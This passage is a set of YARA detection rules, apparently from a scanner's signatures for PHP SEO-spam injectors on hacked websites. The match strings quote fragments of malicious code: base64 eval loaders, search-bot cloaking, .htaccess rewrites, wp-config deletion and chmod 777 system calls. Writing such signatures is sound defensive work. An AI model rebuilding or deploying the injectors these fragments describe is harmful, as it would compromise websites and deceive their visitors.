private rule PR06439 : trigger
{
    strings:
        $ps0 = "*/ eval(base64_decode(\""
    condition:
        $ps0
}

rule php_spamseo_injector_189_02 : spamseo
{
    strings:
        $trigger = "UmFkYXJ8"
    condition:
        $trigger and PR06439
}

rule php_spamseo_injector_189_03 : spamseo
{
    strings:
        $trigger = "require_once($_SERVER[\"DOCUMENT_ROOT\"].\"/includes/inc.class.php\");"
    condition:
        $trigger
}

rule php_spamseo_injector_190 : spamseo
{
    strings:
        $trigger = "eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwokYm90X2xp"
    condition:
        $trigger
}

private rule PR06440 : trigger
{
    strings:
        $ps0 = "if($wpmudak == \"FALSE\"){$wptraffscript='<script"
    condition:
        $ps0
}

rule php_spamseo_injector_191 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06440
}

private rule PR06441 : trigger
{
    strings:
        $ps0 = "/joomla/base/adapterobserver.php');"
    condition:
        $ps0
}

rule php_spamseo_injector_192 : spamseo
{
    strings:
        $trigger = "@require_once(JPATH_ADAPTERSERVER);"
    condition:
        $trigger and PR06441
}

rule php_spamseo_injector_192_02 : spamseo
{
    strings:
        $trigger = "\\n@require_once(JPATH_ADAPTERSERVER);\","
    condition:
        $trigger and PR06441
}

private rule PR06442 : trigger
{
    strings:
        $ps0 = "cFZwdGMrSm1zdjJjL0FxdGE2c"
    condition:
        $ps0
}

private rule PR06443 : trigger
{
    strings:
        $ps0 = "=create_function("
    condition:
        $ps0
}

rule php_spamseo_injector_193 : spamseo
{
    strings:
        $trigger = "';$"
    condition:
        $trigger and PR06442 and PR06443 and PR01414
}

private rule PR06444 : trigger
{
    strings:
        $ps0 = "if(checkrobot()){"
    condition:
        $ps0
}

rule php_spamseo_injector_194 : spamseo
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR01819 and PR06444
}

private rule PR06445 : trigger
{
    strings:
        $ps0 = "$locationRole ="
    condition:
        $ps0
}

private rule PR06446 : trigger
{
    strings:
        $ps0 = "$stringpath ="
    condition:
        $ps0
}

rule php_spamseo_injector_195 : spamseo
{
    strings:
        $trigger = ")+1);break;}}}return$"
    condition:
        $trigger and PR06445 and PR06446 and PR00719
}

private rule PR06447 : trigger
{
    strings:
        $ps0 = "basename($f, \".php\") == \"index\")"
    condition:
        $ps0
}

rule php_spamseo_injector_196 : spamseo
{
    strings:
        $trigger = "HTTP_USER_AGENT"
    condition:
        $trigger and PR06447 and PR00265
}

private rule PR06448 : trigger
{
    strings:
        $ps0 = "@function_exists(\"curl_init\").\"=\".@ini_get(\"allow_url_fopen\");"
    condition:
        $ps0
}

private rule PR06449 : trigger
{
    strings:
        $ps0 = "\".md5(@$_SERVER['REQUEST_URI']));"
    condition:
        $ps0
}

rule php_spamseo_injector_198 : spamseo
{
    strings:
        $trigger = "|google|"
    condition:
        $trigger and PR06448 and PR00070 and PR06449
}

private rule PR06450 : trigger
{
    strings:
        $ps0 = "$tpl"
    condition:
        $ps0
}

rule php_spamseo_injector_199 : spamseo
{
    strings:
        $trigger = "_agents_to_filter"
    condition:
        $trigger and PR06450 and PR00070
}

private rule PR06451 : trigger
{
    strings:
        $ps0 = "chmod($gml.DIRECTORY_SEPARATOR.'.htaccess', 0644);"
    condition:
        $ps0
}

rule php_spamseo_injector_200 : spamseo
{
    strings:
        $trigger = "$idruri = $_SERVER['REQUEST_URI'];"
    condition:
        $trigger and PR00070 and PR06451
}

rule php_spamseo_injector_200_02 : spamseo
{
    strings:
        $trigger = "curl_setopt ( $ch, CURLOPT_URL, \"http://www.love8.pw"
    condition:
        $trigger and PR00070
}

private rule PR06452 : trigger
{
    strings:
        $ps0 = "if(stripos($_SERVER['HTTP_USER_AGENT'], 'Googlebot')"
    condition:
        $ps0
}

private rule PR06453 : trigger
{
    strings:
        $ps0 = "$query = $_SERVER['REQUEST_URI'];"
    condition:
        $ps0
}

private rule PR06454 : trigger
{
    strings:
        $ps0 = "if(isset($query) && preg_match($regex,$query)){"
    condition:
        $ps0
}

private rule PR06455 : trigger
{
    strings:
        $ps0 = "echo '<script>document.location=("
    condition:
        $ps0
}

rule php_spamseo_injector_201 : spamseo
{
    strings:
        $trigger = "file_get_c"
    condition:
        $trigger and PR06452 and PR06453 and PR06454 and PR06455
}

private rule PR06456 : trigger
{
    strings:
        $ps0 = "$htmls =  str_replace(\"/skin/\",$fromsite.\"skin/\",$htmls);"
    condition:
        $ps0
}

private rule PR06457 : trigger
{
    strings:
        $ps0 = "$pagetitle = getCode($htmls,\"/<title>(.*?)<\\/title>/\");"
    condition:
        $ps0
}

rule php_spamseo_injector_202 : spamseo
{
    strings:
        $trigger = "CURLOPT_URL"
    condition:
        $trigger and PR06456 and PR00091 and PR06457
}

private rule PR06458 : trigger
{
    strings:
        $ps0 = "$content = preg_replace(\"#<script(.*?)>([^<]*?)(analytics\\.js|doubleclick\\.net)([^<]*?)</script>#\", \" \", $content);"
    condition:
        $ps0
}

rule php_spamseo_injector_203 : spamseo
{
    strings:
        $trigger = "CURLOPT_URL"
    condition:
        $trigger and PR00091 and PR06458
}

private rule PR06459 : trigger
{
    strings:
        $ps0 = "echo $file_contents;"
    condition:
        $ps0
}

rule php_spamseo_injector_204 : spamseo
{
    strings:
        $trigger = "='http"
    condition:
        $trigger and PR06459 and PR02874
}

private rule PR06460 : trigger
{
    strings:
        $ps0 = "echo \"ok-ok\";exit;"
    condition:
        $ps0
}

rule php_spamseo_injector_205 : spamseo
{
    strings:
        $trigger = ");exit;"
    condition:
        $trigger and PR06460 and PR00070
}

private rule PR06461 : trigger
{
    strings:
        $ps0 = "$_SERVER['HTTP_USER_AGENT'];$x"
    condition:
        $ps0
}

rule php_spamseo_injector_208 : spamseo
{
    strings:
        $trigger = "('*bot*', $x"
    condition:
        $trigger and PR06387 and PR00719 and PR06461
}

rule php_spamseo_injector_209 : spamseo
{
    strings:
        $trigger = "function smartscan($dir) {"
    condition:
        $trigger and PR04981 and PR01431
}

private rule PR06462 : trigger
{
    strings:
        $ps0 = "=str_replace(\"|\",\"\",$"
    condition:
        $ps0
}

rule php_spamseo_injector_211 : spamseo
{
    strings:
        $trigger = "@eval(base64_decode($"
    condition:
        $trigger and PR06462
}

private rule PR06463 : trigger
{
    strings:
        $ps0 = "$conte"
    condition:
        $ps0
}

private rule PR06464 : trigger
{
    strings:
        $ps0 = "timeout"
    condition:
        $ps0
}

private rule PR06465 : trigger
{
    strings:
        $ps0 = "($htprefs)"
    condition:
        $ps0
}

rule php_spamseo_injector_212 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06463 and PR01021 and PR06464 and PR06465
}

private rule PR06466 : trigger
{
    strings:
        $ps0 = "base64_encode($body), false, $context);"
    condition:
        $ps0
}

rule php_spamseo_injector_212_02 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01021 and PR06466 and PR06464
}

private rule PR06467 : trigger
{
    strings:
        $ps0 = "mkdir('"
    condition:
        $ps0
}

private rule PR06468 : trigger
{
    strings:
        $ps0 = "', 0777);"
    condition:
        $ps0
}

private rule PR06469 : trigger
{
    strings:
        $ps0 = ".html', w); fwrite($"
    condition:
        $ps0
}

rule php_spamseo_injector_213 : spamseo
{
    strings:
        $trigger = "><script>parent.location.href='http:"
    condition:
        $trigger and PR06414 and PR06467 and PR06468 and PR06469
}

private rule PR06470 : trigger
{
    strings:
        $ps0 = "{echo'<script"
    condition:
        $ps0
}

private rule PR06471 : trigger
{
    strings:
        $ps0 = "$_SERVER['HTTP_REFERER"
    condition:
        $ps0
}

rule php_spamseo_injector_214 : spamseo
{
    strings:
        $trigger = "google|msn|live|altavista"
    condition:
        $trigger and PR06470 and PR06471
}

rule php_spamseo_injector_215 : spamseo
{
    strings:
        $trigger = "echo @base64_decode(\"PG1hcnF1ZWUgc"
    condition:
        $trigger
}

private rule PR06472 : trigger
{
    strings:
        $ps0 = ": | :'));"
    condition:
        $ps0
}

private rule PR06473 : trigger
{
    strings:
        $ps0 = ".=chr(ord($"
    condition:
        $ps0
}

rule php_spamseo_injector_216 : spamseo
{
    strings:
        $trigger = "!Ak&"
    condition:
        $trigger and PR06414 and PR06472 and PR06473 and PR01550
}

private rule PR06474 : trigger
{
    strings:
        $ps0 = "(string)$_SERVER['QUERY_STRING']);"
    condition:
        $ps0
}

rule php_spamseo_injector_217 : spamseo
{
    strings:
        $trigger = "echo curl_exec($"
    condition:
        $trigger and PR00342 and PR02132 and PR06474
}

rule php_spamseo_injector_218 : spamseo
{
    strings:
        $trigger = "echo '|success|'.$guid.'|';"
    condition:
        $trigger and PR01480
}

private rule PR06475 : trigger
{
    strings:
        $ps0 = "$installStr = file_get_contents(\""
    condition:
        $ps0
}

private rule PR06476 : trigger
{
    strings:
        $ps0 = "echo \"ok"
    condition:
        $ps0
}

rule php_spamseo_injector_219 : spamseo
{
    strings:
        $trigger = "$indexStr = str_replace(\""
    condition:
        $trigger and PR06475 and PR06476
}

private rule PR06477 : trigger
{
    strings:
        $ps0 = "php?'.trim($query.\"|\".$_SERVER[\"SERVER_NAME\"]"
    condition:
        $ps0
}

rule php_spamseo_injector_220 : spamseo
{
    strings:
        $trigger = "function GetFileContent($url){"
    condition:
        $trigger and PR06477 and PR00323 and PR00348
}

private rule PR06478 : trigger
{
    strings:
        $ps0 = "@file_get_contents\\(\"http:\\/\\/(.*)\\/code"
    condition:
        $ps0
}

private rule PR06479 : trigger
{
    strings:
        $ps0 = "$matcholddomain"
    condition:
        $ps0
}

rule php_spamseo_injector_221 : spamseo
{
    strings:
        $trigger = "extract"
    condition:
        $trigger and PR06478 and PR00355 and PR06479 and PR00357
}

private rule PR06480 : trigger
{
    strings:
        $ps0 = "function theme_temp_setup"
    condition:
        $ps0
}

rule php_spamseo_injector_221_02 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR06480 and PR00357 and PR02033
}

private rule PR06481 : trigger
{
    strings:
        $ps0 = "return preg_replace(\"/(<.*?body.*?>)/i\", \""
    condition:
        $ps0
}

rule php_spamseo_injector_222 : spamseo
{
    strings:
        $trigger = "= getcwd()"
    condition:
        $trigger and PR06481 and PR02394
}

private rule PR06482 : trigger
{
    strings:
        $ps0 = "foreach($server as $cn=>$cv)$server[$cn]=$cn.'='.urlencode(strval($cv));$post=implode('&',$server);"
    condition:
        $ps0
}

rule php_spamseo_injector_223 : spamseo
{
    strings:
        $trigger = "=&$_COOKIE;$"
    condition:
        $trigger and PR06482 and PR01700
}

private rule PR06483 : trigger
{
    strings:
        $ps0 = "echo '<div style=\"display: none;\">"
    condition:
        $ps0
}

private rule PR06484 : trigger
{
    strings:
        $ps0 = "if (strrpos($ua, \"Mobile\") == true || strrpos($ua, \"Google\") == true ||"
    condition:
        $ps0
}

rule php_spamseo_injector_224 : spamseo
{
    strings:
        $trigger = "$ua=$_SERVER['HTTP_USER_AGENT'];"
    condition:
        $trigger and PR06483 and PR06484
}

rule php_spamseo_injector_226 : spamseo
{
    strings:
        $trigger = "=file_get_contents(\"$root/$rnd_file\");"
    condition:
        $trigger
}

rule php_spamseo_injector_227 : spamseo
{
    strings:
        $trigger = "get_client_ip().';'.$_SERVER['HTTP_USER_AGENT'].\"\\n\", FILE_APPEND"
    condition:
        $trigger and PR05452 and PR03964
}

rule php_spamseo_injector_228 : spamseo
{
    strings:
        $trigger = "if ($flag==true) {"
    condition:
        $trigger and PR00091 and PR00341 and PR00342
}

private rule PR06485 : trigger
{
    strings:
        $ps0 = "array_push($body,\"%1$tags%3\",$text,\"%2$tags%3\");"
    condition:
        $ps0
}

rule php_spamseo_injector_229 : spamseo
{
    strings:
        $trigger = "if(str"
    condition:
        $trigger and PR06485
}

private rule PR06486 : trigger
{
    strings:
        $ps0 = "$urls[$request_count] = \"http"
    condition:
        $ps0
}

private rule PR06487 : trigger
{
    strings:
        $ps0 = "$domains = preg_split('/\\s*(\\r\\n|\\n|\\r)\\s*/', trim($data), NULL, PREG_SPLIT_NO_EMPTY);"
    condition:
        $ps0
}

rule php_spamseo_injector_230 : spamseo
{
    strings:
        $trigger = "isset($_POST["
    condition:
        $trigger and PR06486 and PR06487
}

rule php_spamseo_injector_231 : spamseo
{
    strings:
        $trigger = "if (substr($url, 0, 4) == \"<!--\") {echo $url;}"
    condition:
        $trigger and PR00091
}

rule php_spamseo_injector_232 : spamseo
{
    strings:
        $trigger = ",$_SERVER[HTTP_USER_AGENT])){echo \"<a"
    condition:
        $trigger and PR05078
}

private rule PR06488 : trigger
{
    strings:
        $ps0 = "$maplinksraz="
    condition:
        $ps0
}

private rule PR06489 : trigger
{
    strings:
        $ps0 = "$cloakornotcloak="
    condition:
        $ps0
}

rule php_spamseo_injector_233 : spamseo
{
    strings:
        $trigger = "$articlesvalue="
    condition:
        $trigger and PR06488 and PR00273 and PR06489
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_234 : spamseo
{
    strings:
        $trigger = "get_"
        $php_spamseo_injector_234_r0 = /<\?php[\s]*\$[\w]+[\s]*=[\s]*file_get_contents\(.http[^;]+\);[\s]*eval\(\$[\w]+\);[\s]*\?>/
    condition:
        $trigger and $php_spamseo_injector_234_r0
}

private rule PR06490 : trigger
{
    strings:
        $ps0 = "PGEgaHJlZj0iaHR0cDovL3NleHN1dC5jb20iIHN0e"
    condition:
        $ps0
}

rule php_spamseo_injector_235 : spamseo
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR06490 and PR01877
}

private rule PR06491 : trigger
{
    strings:
        $ps0 = "print \"#Created post_id: !$post_id!$link!#\\n\";"
    condition:
        $ps0
}

private rule PR06492 : trigger
{
    strings:
        $ps0 = "echo \"#Failed: $post_link#"
    condition:
        $ps0
}

rule php_spamseo_injector_236 : spamseo
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR06491 and PR06492 and PR00397
}

private rule PR06493 : trigger
{
    strings:
        $ps0 = "(ereg(\"Googlebot\""
    condition:
        $ps0
}

rule php_spamseo_injector_237 : spamseo
{
    strings:
        $trigger = "$file = file_get_contents("
    condition:
        $trigger and PR02163 and PR06493 and PR02492
}

rule php_spamseo_injector_238 : spamseo
{
    strings:
        $trigger = "echo 'Path: ' .  $f . '<br />';"
    condition:
        $trigger
}

private rule PR06494 : trigger
{
    strings:
        $ps0 = "]->Title?></title>"
    condition:
        $ps0
}

rule php_spamseo_injector_239 : spamseo
{
    strings:
        $trigger = "$_SERVER['REQUEST_URI'];"
    condition:
        $trigger and PR06494 and PR05452 and PR01746
}

private rule PR06495 : trigger
{
    strings:
        $ps0 = "echo ('<script src=\"http://'.$dmn.'/dmn/js.php?q='.$pill.'\"></script>')"
    condition:
        $ps0
}

rule php_spamseo_injector_240 : spamseo
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR06495
}

rule php_spamseo_injector_241 : spamseo
{
    strings:
        $trigger = "str_replace($list[$i][\"id\"],$list[$i][\"v\"],$"
    condition:
        $trigger and PR00070 and PR04962
}

rule php_spamseo_injector_242 : spamseo
{
    strings:
        $trigger = "@strpos($_SERVER["
    condition:
        $trigger and PR06160 and PR02062
}

private rule PR06496 : trigger
{
    strings:
        $ps0 = "print('<script"
    condition:
        $ps0
}

rule php_spamseo_injector_243 : spamseo
{
    strings:
        $trigger = "/js/js.js"
    condition:
        $trigger and PR06496
}

private rule PR06497 : trigger
{
    strings:
        $ps0 = "FVbFDuwIDvyceU99CJPmFGbmXFZhTofp67fn4Jtl2eVylcszHf7U"
    condition:
        $ps0
}

rule php_spamseo_injector_244 : spamseo
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR06497 and PR00029
}

private rule PR06498 : trigger
{
    strings:
        $ps0 = "abs(crc32($_SERVER['REQUEST_URI']));"
    condition:
        $ps0
}

rule php_spamseo_injector_245 : spamseo
{
    strings:
        $trigger = "if(preg_match_all('!{([^}]+)}!',"
    condition:
        $trigger and PR06498 and PR01480
}

private rule PR06499 : trigger
{
    strings:
        $ps0 = "php /*"
    condition:
        $ps0
}

rule php_spamseo_injector_245_02 : spamseo
{
    strings:
        $trigger = "str_replace"
    condition:
        $trigger and PR06499 and PR06498
}

private rule PR06500 : trigger
{
    strings:
        $ps0 = "load_extra_modules()"
    condition:
        $ps0
}

rule php_spamseo_injector_245_03 : spamseo
{
    strings:
        $trigger = "str_replace"
    condition:
        $trigger and PR06500 and PR06498
}

rule php_spamseo_injector_246 : spamseo
{
    strings:
        $trigger = "PGEgaHJlZj0iaHR0cDovL2phdmhpZGUuY29tIiBzdHlsZT0icG9zaX"
    condition:
        $trigger and PR01877 and PR01479
}

private rule PR06501 : trigger
{
    strings:
        $ps0 = "array(\"%1title%3%sign% $title%2title%3"
    condition:
        $ps0
}

rule php_spamseo_injector_247 : spamseo
{
    strings:
        $trigger = "echo(result(array("
    condition:
        $trigger and PR06501 and PR00323
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_248 : spamseo
{
    strings:
        $trigger = "eva"
        $php_spamseo_injector_248_r0 = /;eval\(\$[\w]+\(\$[\w]+\(\$[\w]+\(\$[\w]+\([^;]{1000}/
    condition:
        $trigger and $php_spamseo_injector_248_r0
}

rule php_spamseo_injector_249 : spamseo
{
    strings:
        $trigger = "cHJlc3MtcmVzcG9uc2l2ZS1mcmVlLyI+UmVzcG9uc2l2ZSB"
    condition:
        $trigger and PR01877 and PR01479
}

private rule PR06502 : trigger
{
    strings:
        $ps0 = "PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3"
    condition:
        $ps0
}

rule php_spamseo_injector_249_02 : spamseo
{
    strings:
        $trigger = "display:none"
    condition:
        $trigger and PR06502 and PR01877 and PR01479
}

private rule PR06503 : trigger
{
    strings:
        $ps0 = "(strstr($_SERVER['HTTP_USER_AGENT"
    condition:
        $ps0
}

rule php_spamseo_injector_250 : spamseo
{
    strings:
        $trigger = "$seo_plugin=get_option(\"ranking\");"
    condition:
        $trigger and PR06503 and PR02092
}

private rule PR06504 : trigger
{
    strings:
        $ps0 = "function ranking() {"
    condition:
        $ps0
}

rule php_spamseo_injector_250_02 : spamseo
{
    strings:
        $trigger = "$seo_plugin=get_option(\"ranking\");"
    condition:
        $trigger and PR06504 and PR02092
}

private rule PR06505 : trigger
{
    strings:
        $ps0 = "aWYoISRfQ09PS0lFW2Jhc2U2NF9kZWNvZGUo"
    condition:
        $ps0
}

rule php_spamseo_injector_251 : spamseo
{
    strings:
        $trigger = "\";eval("
    condition:
        $trigger and PR06505
}

private rule PR06506 : trigger
{
    strings:
        $ps0 = "$tmp = strtolower($_SERVER['HTTP_USER_AGENT']);"
    condition:
        $ps0
}

private rule PR06507 : trigger
{
    strings:
        $ps0 = "= <<<EOF"
    condition:
        $ps0
}

rule php_spamseo_injector_252 : spamseo
{
    strings:
        $trigger = "<div style=\"overflow:hidden;height:1px;\">"
    condition:
        $trigger and PR06506 and PR06507
}

private rule PR06508 : trigger
{
    strings:
        $ps0 = "$page = substr($page,0,strlen($page)-1);"
    condition:
        $ps0
}

private rule PR06509 : trigger
{
    strings:
        $ps0 = "if($content!=\"no\"){"
    condition:
        $ps0
}

rule php_spamseo_injector_253 : spamseo
{
    strings:
        $trigger = "echo $content"
    condition:
        $trigger and PR06508 and PR06509 and PR00070
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_254 : spamseo
{
    strings:
        $trigger = "str_replace(\"<IfModule mod_rewrite.c>\\nRewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing)"
        $php_spamseo_injector_254_r0 = /RewriteCond\s*\%{HTTP_USER_AGENT}\s*\((bing\||yahoo\||google\|)+[^\)]+\)\s*\[/
    condition:
        $trigger and $php_spamseo_injector_254_r0
}

private rule PR06510 : trigger
{
    strings:
        $ps0 = "echo \"#success connection#<"
    condition:
        $ps0
}

rule php_spamseo_injector_255 : spamseo
{
    strings:
        $trigger = "if (array_key_exists ('delete', $_REQUEST)"
    condition:
        $trigger and PR06510 and PR01479
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_256 : spamseo
{
    strings:
        $trigger = "$_SERVER['DOCUMENT_ROOT']"
        $php_spamseo_injector_256_r0 = /echo\s*'\s*(<item>)?\s*<title>\s*<\s*\!\[CDATA\[[^\]]+\]\s*\]\s*>\s*<\/title>/
    condition:
        $trigger and PR03365 and PR01362 and PR03366 and $php_spamseo_injector_256_r0
}

private rule PR06511 : trigger
{
    strings:
        $ps0 = "isset($_SERVER['HTTP_X_FORWARDED_FOR"
    condition:
        $ps0
}

private rule PR06512 : trigger
{
    strings:
        $ps0 = "$urlfilename = \"url\".$clientid;"
    condition:
        $ps0
}

rule php_spamseo_injector_256_02 : spamseo
{
    strings:
        $trigger = "function all_keys"
    condition:
        $trigger and PR06511 and PR03964 and PR06512
}

rule php_spamseo_injector_256_03 : spamseo
{
    strings:
        $trigger = "foreach($result->redirect->headers as $header"
    condition:
        $trigger and PR06511 and PR03964
}

private rule PR06513 : trigger
{
    strings:
        $ps0 = "doorway"
    condition:
        $ps0
}

rule php_spamseo_injector_256_04 : spamseo
{
    strings:
        $trigger = "codetodonor"
    condition:
        $trigger and PR06513
}

private rule PR06514 : trigger
{
    strings:
        $ps0 = "$url = $protocol . $_SERVER"
    condition:
        $ps0
}

private rule PR06515 : trigger
{
    strings:
        $ps0 = "$linkcontent = @file_get_contents($"
    condition:
        $ps0
}

rule php_spamseo_injector_257 : spamseo
{
    strings:
        $trigger = "$ptitle = base64_encode(get_bloginfo("
    condition:
        $trigger and PR00039 and PR02056 and PR06514 and PR06515
}

private rule PR06516 : trigger
{
    strings:
        $ps0 = "$_SERVER[in("
    condition:
        $ps0
}

private rule PR06517 : trigger
{
    strings:
        $ps0 = "?><script type="
    condition:
        $ps0
}

private rule PR06518 : trigger
{
    strings:
        $ps0 = "empty($_COOKIE[in("
    condition:
        $ps0
}

rule php_spamseo_injector_258 : spamseo
{
    strings:
        $trigger = "if(!$GLOBALS["
    condition:
        $trigger and PR00231 and PR06516 and PR06517 and PR06518
}

private rule PR06519 : trigger
{
    strings:
        $ps0 = "=array($_POST[md5(ThePageURL()"
    condition:
        $ps0
}

rule php_spamseo_injector_259 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06519 and PR00355 and PR01392 and PR00357
}

private rule PR06520 : trigger
{
    strings:
        $ps0 = "preg_match( \"~(\" . implode( \"|\", explode( \"|\", @$getindex->index"
    condition:
        $ps0
}

rule php_spamseo_injector_260 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR06520 and PR00357
}

private rule PR06521 : trigger
{
    strings:
        $ps0 = "); echo '<nofollow><noindex><script src=\"'.$"
    condition:
        $ps0
}

rule php_spamseo_injector_262 : spamseo
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR06521 and PR01648
}

private rule PR06522 : trigger
{
    strings:
        $ps0 = "$content = file_get_contents"
    condition:
        $ps0
}

rule php_spamseo_injector_263 : spamseo
{
    strings:
        $trigger = "return (bool)strpos($haystack, $needle);"
    condition:
        $trigger and PR06522 and PR01021
}

private rule PR06523 : trigger
{
    strings:
        $ps0 = "unlink ( './.htaccess' ); file_put_contents ( './.htaccess"
    condition:
        $ps0
}

rule php_spamseo_injector_264 : spamseo
{
    strings:
        $trigger = "file_get_contents ( './.htaccess' ), 'RewriteRule .* index.php [L]"
    condition:
        $trigger and PR06523
}

rule php_spamseo_injector_265 : spamseo
{
    strings:
        $trigger = "echo '[Successfuly_Added] http://' . $_SERVER['HTTP_HOST'] . '/wp-config.php'"
    condition:
        $trigger and PR02521 and PR02439
}

private rule PR06524 : trigger
{
    strings:
        $ps0 = ".urlencode($_SERVER['REMOTE_ADDR']).'&siteurl='.urlencode(get_site_url());$"
    condition:
        $ps0
}

rule php_spamseo_injector_265_02 : spamseo
{
    strings:
        $trigger = "error_reporting("
    condition:
        $trigger and PR02521 and PR06524 and PR01021
}

private rule PR06525 : trigger
{
    strings:
        $ps0 = "file_put_contents(sprintf('%s/wp-loader.php', $file->getPath()), $"
    condition:
        $ps0
}

rule php_spamseo_injector_266 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06525 and PR01431
}

rule php_spamseo_injector_267 : spamseo
{
    strings:
        $trigger = "array('id'=>\"href=\\\"\", 'v'=> \"href=\\\"\".\"http://\".$domain.$path.\"?\"),"
    condition:
        $trigger and PR00371 and PR00050
}

private rule PR06526 : trigger
{
    strings:
        $ps0 = "function GetDomains($"
    condition:
        $ps0
}

rule php_spamseo_injector_268 : spamseo
{
    strings:
        $trigger = "foreach($dirok as $temp"
    condition:
        $trigger and PR04015 and PR06526
}

private rule PR06527 : trigger
{
    strings:
        $ps0 = ".\"/wp-config.php\")){if(unlink($"
    condition:
        $ps0
}

rule php_spamseo_injector_269 : spamseo
{
    strings:
        $trigger = "str_replace('</head>','<script type=\"text/javascript\">'.$"
    condition:
        $trigger and PR00435 and PR06527
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_270 : spamseo
{
    strings:
        $trigger = "base64_decode"
        $php_spamseo_injector_270_r0 = /\$[\w]+[\s]*=[\s]*<<<EOT[^;]+EOT;[\s]*eval/
    condition:
        $trigger and PR00029 and $php_spamseo_injector_270_r0
}

private rule PR06528 : trigger
{
    strings:
        $ps0 = "position:absolute;visibility:collapse;"
    condition:
        $ps0
}

rule php_spamseo_injector_271 : spamseo
{
    strings:
        $trigger = "do_action"
    condition:
        $trigger and PR02056 and PR06528
}

private rule PR06529 : trigger
{
    strings:
        $ps0 = "echo (is_front_page()) ? '"
    condition:
        $ps0
}

rule php_spamseo_injector_272 : spamseo
{
    strings:
        $trigger = "height:0"
    condition:
        $trigger and PR06529 and PR04645
}

private rule PR06530 : trigger
{
    strings:
        $ps0 = "$gitt = curl_exec"
    condition:
        $ps0
}

rule php_spamseo_injector_273 : spamseo
{
    strings:
        $trigger = "@$gitt = file_get_"
    condition:
        $trigger and PR01431 and PR06530 and PR01021
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_273_02 : spamseo
{
    strings:
        $trigger = "@$gitt = file_get_"
        $php_spamseo_injector_273_02_r0 = /function [\w]+\(\)[\s]*\{[\s]*error_reporting\(0\);[^<]+@\$gitt[^>]+[^\(]+add_filter\([^;]+\);[\s]*/
    condition:
        $trigger and PR01431 and PR06323 and PR01021 and $php_spamseo_injector_273_02_r0
}

private rule PR06531 : trigger
{
    strings:
        $ps0 = "if($_POST)"
    condition:
        $ps0
}

rule php_spamseo_injector_273_03 : spamseo
{
    strings:
        $trigger = "@$gitt = file_get_"
    condition:
        $trigger and PR06531 and PR02196 and PR01431 and PR01021
}

private rule PR06532 : trigger
{
    strings:
        $ps0 = "\"Server Admin :"
    condition:
        $ps0
}

private rule PR06533 : trigger
{
    strings:
        $ps0 = "@touch (\"data.txt\");"
    condition:
        $ps0
}

rule php_spamseo_injector_273_04 : spamseo
{
    strings:
        $trigger = "@$gitt = file_get_"
    condition:
        $trigger and PR06532 and PR06533 and PR01431 and PR01021
}

private rule PR06534 : trigger
{
    strings:
        $ps0 = "'find / -type f -name \""
    condition:
        $ps0
}

private rule PR06535 : trigger
{
    strings:
        $ps0 = "\"#already exist#:\""
    condition:
        $ps0
}

private rule PR06536 : trigger
{
    strings:
        $ps0 = "@system(\"chmod 777 \""
    condition:
        $ps0
}

rule php_spamseo_injector_274 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01021 and PR06534 and PR06535 and PR06536
}

rule php_spamseo_injector_275 : spamseo
{
    strings:
        $trigger = "bDVfZzV0X2MybnQ1bnRzKCQzcmwpOw0KNWNoMiAkYzJudDVudHM7DQo/Pi"
    condition:
        $trigger and PR01419
}

private rule PR06537 : trigger
{
    strings:
        $ps0 = "print\"#Unable to create new post#"
    condition:
        $ps0
}

private rule PR06538 : trigger
{
    strings:
        $ps0 = "function add_backlink_to_post($"
    condition:
        $ps0
}

rule php_spamseo_injector_276 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06537 and PR01021 and PR06538
}

private rule PR06539 : trigger
{
    strings:
        $ps0 = "(strpos($sec,\"google\")):"
    condition:
        $ps0
}

rule php_spamseo_injector_277 : spamseo
{
    strings:
        $trigger = "PGZvbnQgc3R5bGU9Im92ZXJmbG93OiBhdXRvOyBwb3NpdGlvbjogYWJzb2x1dGU7IGhl"
    condition:
        $trigger and PR06539 and PR01480
}

rule php_spamseo_injector_278 : spamseo
{
    strings:
        $trigger = "echo GetMetodu(\"http"
    condition:
        $trigger and PR00091 and PR05078
}

private rule PR06540 : trigger
{
    strings:
        $ps0 = "(strpos($sec,\"google\")): $part"
    condition:
        $ps0
}

rule php_spamseo_injector_279 : spamseo
{
    strings:
        $trigger = "$agent = $_SERVER['HTTP_USER_AGENT'];"
    condition:
        $trigger and PR00039 and PR06540
}

private rule PR06541 : trigger
{
    strings:
        $ps0 = "]($xml_link);$google=@$GLOBALS{"
    condition:
        $ps0
}

rule php_spamseo_injector_280 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06541 and PR01431
}

private rule PR06542 : trigger
{
    strings:
        $ps0 = "function getAgent()"
    condition:
        $ps0
}

private rule PR06543 : trigger
{
    strings:
        $ps0 = "echo $htmlcontent;"
    condition:
        $ps0
}

private rule PR06544 : trigger
{
    strings:
        $ps0 = "function get_url_content($url)"
    condition:
        $ps0
}

rule php_spamseo_injector_282 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06542 and PR06543 and PR06544
}

rule php_spamseo_injector_283 : spamseo
{
    strings:
